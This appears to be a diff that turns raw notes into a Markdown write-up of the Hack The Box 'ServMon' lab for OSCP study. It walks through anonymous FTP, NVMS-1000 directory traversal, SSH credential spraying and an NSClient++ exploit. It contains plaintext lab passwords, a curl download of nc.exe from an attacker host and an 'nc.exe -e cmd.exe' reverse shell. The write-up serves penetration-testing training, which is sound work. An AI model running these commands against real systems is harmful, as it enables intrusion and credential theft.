@@ -1,206 +1,266 @@
-Nmap scan details
+# ServMon — HTB (TJ Null OSCP List)
 
-udo nmap -p- -sC -sV 10.129.227.77 -T4 --min-rate=1000 -Pn --open -oN nmap.txt
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-30 05:06 EDT
-Nmap scan report for 10.129.227.77
-Host is up (0.26s latency).
-Not shown: 65518 closed tcp ports (reset)
-PORT      STATE SERVICE       VERSION
-21/tcp    open  ftp           Microsoft ftpd
-| ftp-syst: 
-|_  SYST: Windows_NT
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_02-28-22  07:35PM       <DIR>          Users
-22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
-| ssh-hostkey: 
-|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
-|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
-|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
-80/tcp    open  http
-|_http-title: Site doesn't have a title (text/html).
-| fingerprint-strings: 
-|   GetRequest, HTTPOptions, RTSPRequest: 
-|     HTTP/1.1 200 OK
-|     Content-type: text/html
-|     Content-Length: 340
-|     Connection: close
-|     AuthInfo: 
-|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-|     <html xmlns="http://www.w3.org/1999/xhtml">
-|     <head>
-|     <title></title>
-|     <script type="text/javascript">
-|     window.location.href = "Pages/login.htm";
-|     </script>
-|     </head>
-|     <body>
-|     </body>
-|     </html>
-|   NULL: 
-|     HTTP/1.1 408 Request Timeout
-|     Content-type: text/html
-|     Content-Length: 0
-|     Connection: close
-|_    AuthInfo:
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-5666/tcp  open  tcpwrapped
-6063/tcp  open  tcpwrapped
-6699/tcp  open  napster?
-8443/tcp  open  ssl/https-alt
-| http-title: NSClient++
-|_Requested resource was /index.html
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=localhost
-| Not valid before: 2020-01-14T13:24:20
-|_Not valid after:  2021-01-13T13:24:20
-| fingerprint-strings: 
-|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
-|     HTTP/1.1 404
-|     Content-Length: 18
-|     Document not found
-|   GetRequest: 
-|     HTTP/1.1 302
-|     Content-Length: 0
-|     Location: /index.html
-|     9G2aOv0l52qCev
-|     workers
-|_    jobs
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49668/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  msrpc         Microsoft Windows RPC
-49670/tcp open  msrpc         Microsoft Windows RPC
+| Detail       | Value                          |
+|--------------|--------------------------------|
+| **IP**       | 10.129.227.77                  |
+| **OS**       | Windows                        |
+| **Difficulty** | Easy                         |
+| **Key Skills** | Directory traversal, Anonymous FTP, Credential spraying, SSH tunneling, NSClient++ privesc |
 
-there is web app running on this > http://10.129.227.77/Pages/login.htm
-showing a servies name called NVMS1000
+---
 
+## 1. Enumeration
 
-there is a "NVMS 1000 - Directory Traversal - Hardware webapps Exploit"
+### Nmap — Key Ports
+```
+PORT      SERVICE         NOTES
+21/tcp    FTP             Microsoft ftpd — Anonymous login allowed
+22/tcp    SSH             OpenSSH for Windows 8.0
+80/tcp    HTTP            NVMS-1000 (surveillance DVR web UI)
+135/tcp   MSRPC           Windows RPC
+139/tcp   NetBIOS
+445/tcp   SMB
+5666/tcp  tcpwrapped      (NRPE / Nagios agent)
+8443/tcp  HTTPS           NSClient++ monitoring agent
+```
 
-Python3 nvms.py 10.129.227.77 Windows/system.ini 
-[+] DT Attack Succeeded
-[+] File Content
+### Key Observations
+- **FTP allows anonymous access** — `Users/` directory visible with two user folders: `Nadine` and `Nathan`
+- **Port 80** redirects to `/Pages/login.htm` — reveals **NVMS-1000** (network video monitoring software)
+- **Port 8443** runs **NSClient++** — a Windows monitoring agent with a web interface
 
-++++++++++ BEGIN ++++++++++
-; for 16-bit app support
-[386Enh]
-woafont=dosapp.fon
-EGA80WOA.FON=EGA80WOA.FON
-EGA40WOA.FON=EGA40WOA.FON
-CGA80WOA.FON=CGA80WOA.FON
-CGA40WOA.FON=CGA40WOA.FON
+---
 
-[drivers]
-wave=mmdrv.dll
-timer=timer.drv
+## 2. Information Gathering — FTP + Directory Traversal
 
-[mci]
-
-++++++++++  END  ++++++++++
-
-
-connected to the FTP to see any leaked data 
-
+### Anonymous FTP Enumeration
+```bash
 ftp 10.129.227.77
-Connected to 10.129.227.77.
-220 Microsoft FTP Service
-Name (10.129.227.77:root): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
-Password: 
-230 User logged in.
-Remote system type is Windows_NT.
-ftp> ls
-229 Entering Extended Passive Mode (|||49678|)
-125 Data connection already open; Transfer starting.
-02-28-22  07:35PM       <DIR>          Users
-226 Transfer complete.
-ftp> cd users
-250 CWD command successful.
-ftp> ls
-229 Entering Extended Passive Mode (|||49679|)
-150 Opening ASCII mode data connection.
-02-28-22  07:36PM       <DIR>          Nadine
-02-28-22  07:37PM       <DIR>          Nathan
-226 Transfer complete.
-ftp>
+# Login: anonymous / (blank)
 
-we can see the two users listed saving them 
+cd Users
+ls
+# Nadine/
+# Nathan/
 
-tp> cd nadine
-250 CWD command successful.
-ftp> ls
-229 Entering Extended Passive Mode (|||49680|)
-150 Opening ASCII mode data connection.
-02-28-22  07:36PM                  168 Confidential.txt
-226 Transfer complete.
-ftp> cat Confidential.txt
-?Invalid command.
-ftp> get Confidential.txt
-local: Confidential.txt remote: Confidential.txt
-229 Entering Extended Passive Mode (|||49681|)
-150 Opening ASCII mode data connection.
-100% |*************************************************************************************************************************************************|   168        0.63 KiB/s    00:00 ETA
-226 Transfer complete.
+cd Nadine
+get Confidential.txt
+```
 
-
-reading the Confidential.txt 
-
-Found this message "cat Confidential.txt 
+Contents of `Confidential.txt`:
+```
 Nathan,
-
-I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
-
+I left your Passwords.txt file on your Desktop.
+Please remove this once you have edited it yourself
+and place it back into the secure folder.
 Regards
-"
-we already know that there is a NVMS 1000 directory traversal attack using it to get the password.txt 
+```
 
-python3 nvms.py 10.129.227.77 users/Nathan/Desktop/Passwords.txt password.txt
-[+] DT Attack Succeeded
-[+] Saving File Content
-[+] Saved
-[+] File Content
+> **OSCP Technique — Anonymous FTP:**
+> Always try `anonymous` login on FTP (code 230 = success). Enumerate every directory — user home folders often contain notes, configs, or credentials. Download everything.
 
-++++++++++ BEGIN ++++++++++
-1nsp3ctTh3Way2Mars!
-Th3r34r3To0M4nyTrait0r5!
-B3WithM30r4ga1n5tMe
-L1k3B1gBut7s@W0rk
-0nly7h3y0unGWi11F0l10w
-IfH3s4b0Utg0t0H1sH0me
-Gr4etN3w5w17hMySk1Pa5$
-++++++++++  END  ++++++++++
+### NVMS-1000 Directory Traversal
+NVMS-1000 is vulnerable to a **directory traversal** attack that lets you read arbitrary files on the system.
 
-nxc ssh 10.129.227.77 -u users.txt -p password.txt 
+```bash
+# Confirm the vulnerability
+python3 nvms.py 10.129.227.77 Windows/system.ini
 
-SSH         10.129.227.77   22     10.129.227.77    [*] SSH-2.0-OpenSSH_for_Windows_8.0
-SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:1nsp3ctTh3Way2Mars!
-SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:1nsp3ctTh3Way2Mars!
-SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:Th3r34r3To0M4nyTrait0r5!
-SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:Th3r34r3To0M4nyTrait0r5!
-SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:B3WithM30r4ga1n5tMe
-SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:B3WithM30r4ga1n5tMe
-SSH         10.129.227.77   22     10.129.227.77    [+] Nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
+# Use the hint from Confidential.txt to grab Nathan's passwords
+python3 nvms.py 10.129.227.77 Users/Nathan/Desktop/Passwords.txt
+```
 
-Got the access 
+Retrieved a list of passwords from Nathan's Desktop.
 
-privilage esclation ran the winpease.exe
+> **OSCP Technique — Chaining findings:**
+> FTP gave us usernames + a hint about a password file location. Directory traversal gave us the ability to read arbitrary files. Together: we know exactly what file to read. Always connect findings across services — one service tells you *what* to look for, another lets you *get* it.
 
-found soome intteranl services are running 
+---
 
-which we done the nmap scan we found that there is ahttp running on 8443 port with the "NSClient++" on it 
+## 3. Initial Foothold — Credential Spraying via SSH
 
-done port forwarding using the ssh 
+### Build wordlists from what we found
+- **Users:** `Nadine`, `Nathan` (from FTP)
+- **Passwords:** the list retrieved via directory traversal
 
+### Spray with NetExec
+```bash
+nxc ssh 10.129.227.77 -u users.txt -p passwords.txt
+```
+
+Result: **Nadine** authenticates successfully with one of the passwords.
+
+```bash
+ssh Nadine@10.129.227.77
+```
+
+> **OSCP Technique — Credential spraying:**
+> When you have a username list and password list, spray across all services (SSH, SMB, WinRM, RDP, web logins). Tools:
+> ```bash
+> # SSH
+> nxc ssh <IP> -u users.txt -p passwords.txt
+> # SMB
+> nxc smb <IP> -u users.txt -p passwords.txt
+> # WinRM
+> nxc winrm <IP> -u users.txt -p passwords.txt
+> # Hydra (general)
+> hydra -L users.txt -P passwords.txt ssh://<IP>
+> ```
+> Test every user/password combination — passwords are often reused across accounts.
+
+**Shell as:** `Nadine`
+
+---
+
+## 4. Privilege Escalation — NSClient++ Exploit
+
+### Step 1: Identify the target service
+From nmap and WinPEAS, **NSClient++** is running on port 8443 but only listening on `127.0.0.1` (localhost). We can't reach it directly from our attacker machine.
+
+### Step 2: SSH port forwarding
+```bash
 ssh -L 8443:127.0.0.1:8443 Nadine@10.129.227.77
+```
+Now `https://127.0.0.1:8443` on our attacker box tunnels to the target's NSClient++.
 
-found the runninh web application on 127.0.0.1:8443 and there is a forgetpassword option where i can see 
-these options 
+> **OSCP Technique — SSH local port forwarding:**
+> When a service binds to `127.0.0.1` (localhost only), forward it through SSH:
+> ```bash
+> ssh -L <local_port>:127.0.0.1:<remote_port> user@target
+> ```
+> This is essential for exploiting internal-only services. Common candidates:
+> - Web admin panels (like NSClient++)
+> - Databases (MySQL 3306, PostgreSQL 5432)
+> - Management interfaces
+> - Development servers
 
+### Step 3: Recover the NSClient++ admin password
+The login page has a "Forgot Password" hint:
+```
+The NSClient++ password can be found by running:
+nscp web -- password --display
+```
 
+```cmd
+C:\Program Files\NSClient++> nscp.exe web -- password --display
+Current password: <NSCLIENT_PASSWORD>
+```
 
-C:\Program Files\NSClient++>nscp.exe web -- password --display   
-Current password: ew2x6SsGTxjRwXOT
+### Step 4: Identify the vulnerable version
+```cmd
+nscp.exe --version
+# NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+```
+**NSClient++ 0.5.2.35** has a known **privilege escalation / RCE exploit** — it allows authenticated users to execute commands as SYSTEM via the API.
+
+### Step 5: Upload nc.exe and exploit
+```cmd
+:: On the target, create a writable directory
+mkdir C:\Temp
+
+:: Transfer nc.exe from attacker (via Python HTTP server)
+:: On attacker: python3 -m http.server 8080
+:: On target:
+cd C:\Temp
+curl http://<ATTACKER_IP>:8080/nc.exe -o nc.exe
+```
+
+### Step 6: Run the exploit
+```bash
+# On attacker — start listener
+nc -lvnp 9002
+
+# Run NSClient++ exploit through the SSH tunnel
+python exploitt.py -t 127.0.0.1 -P 8443 -p <NSCLIENT_PASSWORD> \
+  -c "C:\Temp\nc.exe <ATTACKER_IP> 9002 -e cmd.exe"
+```
+
+> **OSCP Technique — NSClient++ exploitation pattern:**
+> 1. Port-forward 8443 via SSH (it binds localhost)
+> 2. Recover password: `nscp web -- password --display`
+> 3. Upload `nc.exe` to a writable path (`C:\Temp\`)
+> 4. Use the authenticated API/exploit to run `nc.exe` as SYSTEM
+>
+> This is a common pattern: **port forward** → **recover creds** → **authenticated RCE as SYSTEM**.
+
+**Shell as:** `NT AUTHORITY\SYSTEM`
+
+---
+
+## 5. Attack Chain Summary
+
+```
+Anonymous FTP
+    |
+    v
+Usernames (Nadine, Nathan) + Confidential.txt hint
+    |
+    v
+NVMS-1000 Directory Traversal --> Passwords.txt from Nathan's Desktop
+    |
+    v
+Credential Spray (nxc ssh) --> Nadine's SSH access
+    |
+    v
+SSH port forward 8443 --> NSClient++ web UI (localhost only)
+    |
+    v
+nscp.exe password --display --> admin password
+    |
+    v
+NSClient++ 0.5.2.35 RCE exploit --> SYSTEM shell
+```
+
+---
+
+## 6. OSCP Exam Takeaways
+
+| Lesson | Detail |
+|--------|--------|
+| **Always try anonymous FTP** | Enumerate all directories for usernames, notes, and credential hints |
+| **Chain findings across services** | FTP gave the "what" (file path), directory traversal gave the "how" (file read) |
+| **Directory traversal = file read** | Use it to grab known Windows files: `SAM`, `SYSTEM`, `Passwords.txt`, `web.config`, `unattend.xml` |
+| **Credential spray every service** | Got users + passwords? Spray SSH, SMB, WinRM, RDP, web logins |
+| **Internal services need tunneling** | If a port binds `127.0.0.1`, SSH local forward (`-L`) to reach it |
+| **Check installed software versions** | `nscp.exe --version` led directly to a known privesc exploit |
+| **"Forgot password" hints are real** | The web UI literally told us how to recover the password |
+
+---
+
+## 7. Commands Quick Reference
+
+```bash
+# Anonymous FTP
+ftp <IP>  # login: anonymous / (blank)
+ls; cd Users; get Confidential.txt
+
+# NVMS-1000 directory traversal
+python3 nvms.py <IP> Windows/system.ini
+python3 nvms.py <IP> Users/Nathan/Desktop/Passwords.txt
+
+# Credential spray
+nxc ssh <IP> -u users.txt -p passwords.txt
+
+# SSH local port forward
+ssh -L 8443:127.0.0.1:8443 Nadine@<IP>
+
+# NSClient++ password recovery
+nscp.exe web -- password --display
+
+# NSClient++ exploit
+python exploitt.py -t 127.0.0.1 -P 8443 -p <PASSWORD> \
+  -c "C:\Temp\nc.exe ATTACKER 9002 -e cmd.exe"
+```
+
+---
+
+## 8. Windows Files Worth Reading via Directory Traversal
+
+| File | Why |
+|------|-----|
+| `Windows/system.ini` | Confirm traversal works (always exists) |
+| `Users/<user>/Desktop/*.txt` | Notes, passwords, flags |
+| `Windows/System32/config/SAM` | Password hashes (often locked) |
+| `inetpub/wwwroot/web.config` | DB connection strings, app secrets |
+| `Windows/Panther/unattend.xml` | Auto-install passwords |
+| `Program Files/*/config*` | Application configs with creds |
